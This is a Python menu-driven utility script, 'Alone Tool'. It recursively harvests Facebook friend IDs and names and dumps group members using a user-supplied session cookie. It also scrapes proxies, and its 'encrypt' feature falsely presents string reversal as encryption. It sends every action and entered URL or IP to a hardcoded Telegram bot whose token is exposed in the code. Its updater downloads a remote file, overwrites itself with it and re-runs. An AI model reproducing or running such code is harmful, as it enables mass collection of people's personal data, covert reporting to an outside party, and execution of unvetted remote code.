import os
import sys
import re
import requests
import random
import json
import time
from datetime import datetime
from urllib.parse import quote, urlparse
from bs4 import BeautifulSoup

# Telegram Bot Info
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID   = "1241769879"

# GitHub raw URL for updating this script
UPDATE_URL = "https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py"

# Color codes helper

def color(code):
    return f"\033[{code}m"

class C:
    HEADER    = color('95')
    OKBLUE    = color('94')
    OKCYAN    = color('96')
    OKGREEN   = color('92')
    WARNING   = color('93')
    FAIL      = color('91')
    ENDC      = color('0')
    BOLD      = color('1')
    UNDERLINE = color('4')

# Utility functions

def clear():
    os.system('clear' if os.name != 'nt' else 'cls')


def printc(msg, col=C.ENDC):
    print(f"{col}{msg}{C.ENDC}")


def send_log(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = { 'chat_id': CHAT_ID, 'text': msg }
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass


def log_and_notify(action):
    ts = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
    msg = f"[•] {action} | {ts}"
    send_log(msg)
    printc(msg, C.OKCYAN)


# Feature: Proxy Options

def proxy_options():
    clear()
    printc('[•] Proxy Options', C.OKCYAN)

    try:
        res = requests.get(
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            timeout=5
        )
        proxies = [p.strip() for p in res.text.splitlines() if p.strip()]

        with open('proxy.txt', 'w') as f:
            for p in proxies:
                f.write(p + '\n')

        log_and_notify(f'Fetched {len(proxies)} proxies')
        printc(f"[•] Saved {len(proxies)} proxies to proxy.txt", C.OKGREEN)

    except Exception as e:
        printc(f"[!] Error: {e}", C.FAIL)

    input('[•] Press Enter to return...')


# Feature: User-Agent Generator

def user_agent_generator():
    clear()
    printc('[•] User-Agent Generator', C.OKCYAN)

    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
        'Mozilla/5.0 (Linux; Android 10)...'
    ]

    with open('ug.txt', 'w') as f:
        for _ in range(50):
            ua = random.choice(agents)
            f.write(ua + '\n')

    log_and_notify('Generated 50 user-agents')
    printc('[•] Saved UAs to ug.txt', C.OKGREEN)

    input('[•] Press Enter to return...')


# Feature: Send HTTP Request

def send_http_request():
    clear()
    printc('[•] Send HTTP Request', C.OKCYAN)

    url = input('[•] URL: ').strip()

    try:
        r = requests.get(url, timeout=5)
        log_and_notify(f'Request to {url} status {r.status_code}')
        printc(f"[•] Status: {r.status_code}", C.OKGREEN)

    except Exception as e:
        printc(f"[!] Error: {e}", C.FAIL)

    input('[•] Press Enter to return...')


# Feature: IP Lookup

def look_ip_info():
    clear()
    printc('[•] Look IP Info', C.OKCYAN)

    ip = input('[•] IP: ').strip()

    try:
        info = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()

        for k, v in info.items():
            printc(f"{k}: {v}", C.OKBLUE)

        log_and_notify(f'IP lookup {ip}')

    except Exception:
        printc('[!] Failed to fetch IP info', C.FAIL)

    input('[•] Press Enter to return...')


# Feature: Facebook IDs Extractor

def facebook_ids_extractor():
    clear()
    printc('[•] Facebook IDs Extractor', C.OKCYAN)

    target = input('[•] Profile URL or ID: ').strip()
    seen = set()

    def extract(uid):
        url = f'https://mbasic.facebook.com/profile.php?id={uid}&v=friends'
        headers = { 'User-Agent': 'Mozilla/5.0' }
        r = requests.get(url, headers=headers, timeout=5)
        bs = BeautifulSoup(r.text, 'html.parser')

        for a in bs.find_all('a', href=True):
            m = re.search(r'id=(\d+)', a['href'])
            if m:
                fid = m.group(1)
                name = a.text

                if fid not in seen:
                    seen.add(fid)
                    printc(f"{fid} | {name}", C.OKGREEN)

                    with open('ids.txt', 'a') as f:
                        f.write(f"{fid}|{name}\n")

                    extract(fid)

    extract(target)

    log_and_notify(f'Extracted {len(seen)} IDs')

    input('[•] Press Enter to return...')


# Feature: Group Member ID Dumper

def group_member_dumper():
    clear()
    printc('[•] Group Member ID Dumper', C.OKCYAN)

    grp_url = input('[•] Group URL: ').strip()
    cookie  = input('[•] FB Cookie: ').strip()
    headers = { 'User-Agent': 'Mozilla/5.0', 'Cookie': cookie }

    m = re.search(r'groups/(\d+)', grp_url)
    if not m:
        printc('[!] Invalid group URL', C.FAIL)
        input('[•] Press Enter to return...')
        return

    gid = m.group(1)
    page_url = f'https://mbasic.facebook.com/groups/{gid}/members'
    seen = []

    while page_url:
        r = requests.get(page_url, headers=headers, timeout=5)
        bs = BeautifulSoup(r.text, 'html.parser')

        for a in bs.find_all('a', href=True):
            m2 = re.search(r'id=(\d+)', a['href'])
            if m2:
                fid = m2.group(1)
                name = a.text

                if fid not in seen:
                    seen.append(fid)
                    printc(f"{fid} | {name}", C.OKGREEN)

                    with open('groupids.txt', 'a') as f:
                        f.write(f"{fid}|{name}\n")

        nxt = bs.find('a', string='See More')
        page_url = 'https://mbasic.facebook.com' + nxt['href'] if nxt else None

    log_and_notify(f'Dumped {len(seen)} members')

    input('[•] Press Enter to return...')


# Feature: Encrypt Code

def encrypt_code():
    clear()
    printc('[•] Encrypt File', C.OKCYAN)

    fn = input('[•] Filename: ').strip()
    if not os.path.isfile(fn):
        printc('[!] File not found', C.FAIL)
        input('[•] Press Enter to return...')
        return

    with open(fn, 'r') as f:
        code = f.read()

    out = 'encrypted_' + os.path.basename(fn)
    with open(out, 'w') as f:
        f.write(code[::-1])

    log_and_notify(f'Encrypted {fn} -> {out}')
    printc(f"[•] Saved to {out}", C.OKGREEN)

    input('[•] Press Enter to return...')


# Feature: Update Self

def update_self():
    clear()
    printc('[•] Updating from GitHub...', C.OKCYAN)

    try:
        r = requests.get(UPDATE_URL, timeout=10)
        r.raise_for_status()

        with open(__file__, 'w', encoding='utf-8') as f:
            f.write(r.text)

        printc('[•] Update complete. Restarting...', C.OKGREEN)
        os.execvp(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        printc(f'[!] Update failed: {e}', C.FAIL)
        input('[•] Press Enter to return...')


# Main Menu Loop

while True:
    clear()
    printc('█████╗ ██╗      ██████╗ ███╗   ██╗███████╗', C.OKCYAN)
    printc('██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝', C.OKCYAN)
    printc('███████║██║     ██║   ██║██╔██╗ ██║█████╗  ', C.OKCYAN)
    printc('██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║', C.OKCYAN)
    printc('██║  ██║███████╗╚██████╔╝██║ ╚████║███████║', C.OKCYAN)
    printc('╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝', C.OKCYAN)
    printc('A L O N E   T O O L', C.BOLD)

    printc('[1] Proxy Options', C.OKGREEN)
    printc('[2] User-Agent Generator', C.OKGREEN)
    printc('[3] Send HTTP Request', C.OKGREEN)
    printc('[4] Look IP Info', C.OKGREEN)
    printc('[5] Facebook IDs Extractor', C.OKGREEN)
    printc('[6] Group Member ID Dumper', C.OKGREEN)
    printc('[7] Encrypt Code', C.OKGREEN)
    printc('[8] Update Tool', C.OKGREEN)
    printc('[0] Exit', C.FAIL)

    choice = input('[?] Choose an option: ').strip()
    if choice == '1': proxy_options()
    elif choice == '2': user_agent_generator()
    elif choice == '3': send_http_request()
    elif choice == '4': look_ip_info()
    elif choice == '5': facebook_ids_extractor()
    elif choice == '6': group_member_dumper()
    elif choice == '7': encrypt_code()
    elif choice == '8': update_self()
    elif choice == '0': break
    else:
        printc('[!] Invalid choice', C.FAIL)
        time.sleep(1)

